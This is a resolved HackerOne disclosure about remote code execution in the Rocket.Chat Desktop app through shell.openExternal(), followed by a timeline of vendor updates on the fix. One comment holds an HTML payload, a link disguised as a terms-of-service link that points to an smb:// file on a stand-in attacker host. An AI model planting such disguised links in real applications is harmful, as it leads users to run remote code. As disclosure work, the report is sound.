---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/os-command-injection
  - env/web
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
date: 2022-08-01
submitted: 2020-07-15T10:00:26.071Z
bounty_usd: null
votes: 13
cve: []
program: "[[programs/rocket_chat|Rocket.Chat]]"
reporter: "baltpeter"
source: "https://hackerone.com/reports/924151"
title: "Insecure use of shell.openExternal() in Rocket.Chat Desktop App leading to RCE"
---
# Insecure use of shell.openExternal() in Rocket.Chat Desktop App leading to RCE

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 13 | **Program:** Rocket.Chat | **Disclosed:** 2022-08-01

- Report: [https://hackerone.com/reports/924151](https://hackerone.com/reports/924151)
- CWE: OS Command Injection
- Submitted: 2020-07-15T10:00:26.071Z

## Timeline

- **Report Filed**
- **2020-07-15** @baltpeter: To add to this: The administrator of the server can set various messages like "Home Body" and "Login Terms", including the ability to place arbitrary links. By including the following in this message, they can obfuscate the URL of the payload:

```html
<a href="smb://attacker.tld/public/pwn.desktop">See our terms of service.</a>
```
- **Report Triaged**
- **2020-08-29** @baltpeter: Hi @markus-rocketchat,

any updates on this?

Best Regards,
Benjamin
- **2020-08-30** @markus-rocketchat: Hi @baltpeter 

sorry for the silence. Your report is on our task list. 

So we are planning some updates for the desktop app in the weeks to come, also adressing this. But we have to do some larger changes in general, this is why it is taking a bit longer than expected.

Thank you for your patience. I hope to share some news soon.

Best
Markus
- **2020-09-22** @markus-rocketchat: Hi @baltpeter 

just a quick follow-up: we have a solution upcoming, that requires users to accept opening "exotic" protocols like smb, rather than opening them right away
we are currently testing it and it should arrive soon

Best
Markus
- **2020-09-22** @baltpeter: Hi @markus-rocketchat,

that sounds good. Thanks for the update!

Best Regards,
Benjamin
- **2020-12-03** @markus-rocketchat: Hi @baltpeter 

another update from our side: we recently merged an attempt for a fix but got another report in with some additional mitigation advice. So before closing this one, me and the team would like to reconsider our existing solution in light of the recent feedback.

Will keep you posted.
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
